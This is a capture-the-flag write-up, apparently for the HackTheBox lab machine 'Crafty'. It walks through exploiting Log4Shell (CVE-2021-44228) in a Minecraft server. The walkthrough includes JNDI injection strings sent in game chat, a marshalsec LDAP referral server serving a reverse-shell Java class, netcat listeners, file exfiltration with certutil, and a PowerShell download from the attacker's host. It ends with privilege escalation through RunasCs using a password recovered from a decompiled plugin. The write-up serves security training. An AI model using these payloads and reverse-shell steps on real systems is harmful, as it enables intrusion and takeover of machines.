## **Summary**

The exploit of Log4shell(CVE-2021-44228) in minecraft gave initial access to the machine, then the administrator's password was retreived by decompiing a plugin used by the minecraft server.

## **Enumeration**

### **nmap**

We started off with a port scan, it shows tow open ports, 80 which is the default for http and 25565 which is commonly used to host mincraft servers.

```
$ nmap 10.10.11.249 -sV -p 80,25565
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-09 10:23 +01
...
80/tcp    open  http      Microsoft IIS httpd 10.0
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
```

### **http - port 80**

Browsing to the web app gave us a subdomain: `play.crafty.htb`.

### **mincraft - port 25565**

We used [tlauncher](https://tlauncher.org/en/) to connect to the mincraft server.

We downloaded the zip archive for linux, then extracted it and finally ran it

```
java -jar TLauncher.jar
```

Once started, we chose version `1.16.5` as we have seen in the `nmap` scan, then we hit `Enter the game`.

We chose `Multiplayer` from the newly opened window.

Clicked on `Direct Connection`.

Then entered `play.crafty.htb` in `Server Address`.

This version Minecraft is vulnerable to [Log4Shell (CVE-2021-44228)](https://en.wikipedia.org/wiki/Log4Shell), which is a critical security vulnerability in the Apache Log4j library that allows attackers to execute arbitrary code on affected systems.

To test for it, we set a listener on port 389, to mimic an ldap server.

```
$ nc -lnvp 389
```

On the chat `(press T)`, we entered `${jndi:ldap://10.10.14.106/a}`, and we noticed a connection in our listener.

## Initial access

To exploit this vulnerability, we had to install `jdk-8`, it can be downloaded from [Oracle](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html) or from [Openlogic](https://www.openlogic.com/openjdk-downloads)

We then setup `marshalsec`

> Marshalsec is an open-source tool used for testing vulnerabilities in Java serialization and deserialization processes, particularly related to JNDI lookups. It allows users to set up servers that can redirect requests to execute arbitrary code.

```
$ git clone https://github.com/mbechler/marshalsec
$ cd marshalsec
$ mvn clean package -DskipTests
```
And create a java class that will give remote code execution.

```
$ mkdir server
$ cd server
$ wget https://raw.githubusercontent.com/xiajun325/apache-log4j-rce-poc/master/src/main/java/Log4jRCE.java
```

We modified `cmd` variable in `Log4jRCE.java` with the command that will give us a reverse shell, this was a powershell command generated using [revshells](https://www.revshells.com/).

After that we compiled the java class.

```
$ javac Log4jRCE.java
```

Next, we had to setup two servers, the first is an http server to serve the java class we compiled, and the second is an LDAP referal server. 

For the http server we used a python.

```
$ python -m http.server
```

And for LDAP we used Marshalsec.

```
$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.10.14.65:8000/#Log4jRCE"
```

We started a listener

```
$ nc -lnvp 9000
```

Then injected the following line into mincraft chat.

```
${jndi:ldap://10.10.14.65:1389/Log4jRCE}
```

Once executed we were able to receive a connection in our reverse shell.

## Privilege escalation

Mincraft was using `playercounter` plugin, located at `C:\users\svc_minecraft\server\plugins\`.

We used `certutil` to extract it to our machine for analysis.

First, we encoded it using base64:

```
PS > certutil -encode playercounter-1.0-SNAPSHOT.jar ../../hrh.b64
```

Then copied it to our machine, and reconstructed the `jar` file.

```
$ cat a.b64 | base64 -d > playercounter.jar
```

Lastly, we decompiled the `.jar` file using [jd-gui](https://java-decompiler.github.io/).

```
$ jd-gui playercounter.jar
```

We found what seems like a password `s67u84zKq8IXw`, we thought it could be for the `Administrator` account.

We dowloaded `RunasCs` and extracted it into the directory where we started the python server.

> RunasCs is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials.

```
$ https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
$ unzip RunasCs.zip
```

Uploaded it to the target machine.

```
PS C:\users\svc_minecraft> powershell.exe iwr http://10.10.14.65:8000/RunasCs.exe -O hrh_runascs.exe
```

Using the password we found and the username `Administrator`, we were able to escalate our privileges.

```
PS C:\users\svc_minecraft> ./hrh_runascs.exe Administrator s67u84zKq8IXw whoami

crafty\administrator
```
